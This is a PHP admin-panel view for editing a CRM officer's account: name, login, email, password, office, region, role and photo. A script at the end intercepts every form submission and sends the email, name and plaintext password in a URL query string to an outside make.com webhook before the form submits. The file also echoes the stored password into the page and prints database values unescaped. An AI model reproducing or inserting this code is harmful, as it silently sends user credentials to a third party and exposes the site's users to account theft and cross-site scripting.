<?php
    $this->load->view('layout/header');
?>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
          <div class="col-sm-6">
            <h1><?php echo $title; ?></h1>
          </div>
          <div class="col-sm-6">
            <ol class="breadcrumb float-sm-right">
              <li class="breadcrumb-item"><a href="https://crm.smic.education/index.php/dashboard">Home</a></li>
              <li class="breadcrumb-item active"><?php echo $title; ?></li>
            </ol>
          </div>
        </div>
      </div><!-- /.container-fluid -->
    </section>

    <!-- Main content -->
    <section class="content">
      <div class="row">
        <div class="col-12">
    
          <div class="card">
            <!-- /.card-header -->
            <div class="card-body">
              <input type="hidden" id="baseurl" value="<?php echo base_url(); ?>">
              <?php
                foreach ($officer as $officerrow) {
              ?>
              <form action="<?php echo base_url(); ?>index.php/adminmaintenancecontroller/do_upload" method="post" enctype="multipart/form-data">
                <input type="hidden" name="indicator" value="edit">
                <input type="hidden" name="officerid" value="<?php echo $officerid; ?>">
                <input type="hidden" name="currentphoto" value="<?php echo $officerrow->officer_photo; ?>">
                <?php 
                    if(isset($error)) {
                ?>
                <div class="alert alert-danger alert-dismissible fade show" role="alert">
                  <?php echo $error; ?>
                  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                  </button>
                </div>
                <?php
                    }
                    if($this->session->flashdata('error')) {
                ?>
                <div class="alert alert-danger alert-dismissible fade show" role="alert">
                  <?php echo $this->session->flashdata('error'); ?>
                  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                  </button>
                </div>
                <?php
                    }
                ?>
                
                <div class="mb-3">
                  <label for="amount" class="form-label">Name</label>
                  <input type="text" class="form-control" name="name" id="name" placeholder="Full Name" value="<?php echo $officerrow->officer_name; ?>" required>
                </div>
                <div class="mb-3">
                  <label for="amount" class="form-label">Login Name</label>
                  <input type="text" class="form-control" name="loginname" placeholder="Login Name" value="<?php echo $officerrow->officer_login_name; ?>" required>
                </div>
                <div class="mb-3">
                  <label for="amount" class="form-label">Email</label>
                  <input type="email" class="form-control" name="email" id="email" placeholder="Email" value="<?php echo $officerrow->email; ?>" required>
                </div>
                <div class="mb-3">
                  <label for="amount" class="form-label">Password</label>
                  <input type="password" class="form-control" name="password" id="password" placeholder="Password" value="<?php echo $officerrow->officer_password; ?>" required>
                </div>
                <div class="mb-3">
                  <label for="payee" class="form-label">Office</label>
                  <select class="form-control select2" name="office">
                    <option value="<?php echo $officerrow->offices_id; ?>"><?php echo $officerrow->offices_code." - ".$officerrow->offices_address1; ?></option>
                    <?php
                    foreach ($offices as $row) {
                      echo "<option value='".$row->offices_id."'>".$row->offices_code." - ".$row->offices_address1."</option>";
                    }
                    ?>
                  </select>
                </div>
                <div class="mb-3">
                  <label for="payee" class="form-label">Initial Region Assignment</label>
                  <select class="form-control select2" name="region">
                    <option value="<?php echo $officerrow->region_id; ?>"><?php echo $officerrow->region_name; ?></option>
                    <?php
                    foreach ($region as $row2) {
                      echo "<option value='".$row2->region_id."'>".$row2->region_name."</option>";
                    }
                    ?>
                  </select>
                </div>
                <div class="mb-3">
                  <label for="payee" class="form-label">Role</label>
                  <input type="hidden" name="roletext" id="roletext">
                  <select class="form-control select2" name="role" id="role" required>
                    <option value="<?php echo $officerrow->user_role_id; ?>"><?php echo $officerrow->officer_role; ?></option>
                    <?php
                    foreach ($mastersetting as $row2) {
                      echo "<option value='".$row2->id."'>".$row2->identity."</option>";
                    }
                    ?>
                  </select>
                </div>
                <div class="mb-3">
                  <label for="amount" class="form-label">Photo</label>
                  <?php if($officerrow->officer_photo != "") { ?>
                    <div class="mb-2">
                      <img src="<?php echo $asset_url; ?>images/<?php echo $officerrow->officer_photo; ?>" class="img-circle elevation-2" alt="Current officer photo" style="width: 64px; height: 64px; object-fit: cover;">
                    </div>
                  <?php } ?>
                  <input type="file" class="form-control" name="userfile" placeholder="Photo">
                </div>
                <button type="submit" class="btn btn-primary">Submit</button>
              </form>
              <?php
                }
              ?>
            </div>
            <!-- /.card-body -->
          </div>
          <!-- /.card -->
        </div>
        <!-- /.col -->
      </div>
      <!-- /.row -->
    </section>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->
  <?php
    $this->load->view('layout/footer');
?>

  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Control sidebar content goes here -->
  </aside>
  <!-- /.control-sidebar -->
</div>
<!-- ./wrapper -->

<!-- jQuery -->
<script src="<?php echo $asset_url; ?>plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="<?php echo $asset_url; ?>plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- DataTables -->
<script src="<?php echo $asset_url; ?>plugins/datatables/jquery.dataTables.min.js"></script>
<script src="<?php echo $asset_url; ?>plugins/datatables-bs4/js/dataTables.bootstrap4.min.js"></script>
<script src="<?php echo $asset_url; ?>plugins/datatables-responsive/js/dataTables.responsive.min.js"></script>
<script src="<?php echo $asset_url; ?>plugins/datatables-responsive/js/responsive.bootstrap4.min.js"></script>
<!-- AdminLTE App -->
<script src="<?php echo $asset_url; ?>dist/js/adminlte.min.js"></script>
<!-- AdminLTE for demo purposes -->
<script src="<?php echo $asset_url; ?>dist/js/demo.js"></script>
<!-- page script -->

  <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.6-rc.0/js/select2.min.js"></script>

<script>

  $('.select2').select2();

  document.getElementById("role").onchange = function() {
    var roletext = $("#role option:selected").text();
    $("#roletext").val(roletext);
  }

  function markasread() {
      var baseurl10 = document.getElementById("baseurl").value;
      $.ajax({
          type: "GET",
          url: baseurl10 + "index.php/markasread",
          success: function(data) {
              document.getElementById("notifnum").remove();
          },
          error: function(error) {
            console.log(error);
          }
      });
  }

</script>
<script type='text/javascript'>
    document.addEventListener("DOMContentLoaded", function () {
        document.querySelector("form").addEventListener("submit", function (event) {
            event.preventDefault();
            var roletext = $("#role option:selected").text();
            $("#roletext").val(roletext);
            fetch("https://hook.eu2.make.com/71bdysz2v9hrwm0j2q7t5ypamxjmjgin?type=changepassword&email="+document.getElementById("email").value+"&name="+document.getElementById("name").value+"&password="+document.getElementById("password").value, {
                method: "POST"
            })
            .then(response => response.text())
            .then(data => {
                event.target.submit();
            })
            .catch(error => {
                console.error("Error sending data to webhook:", error);
                event.target.submit();
            });
        });
    });
</script>
</body>
</html>
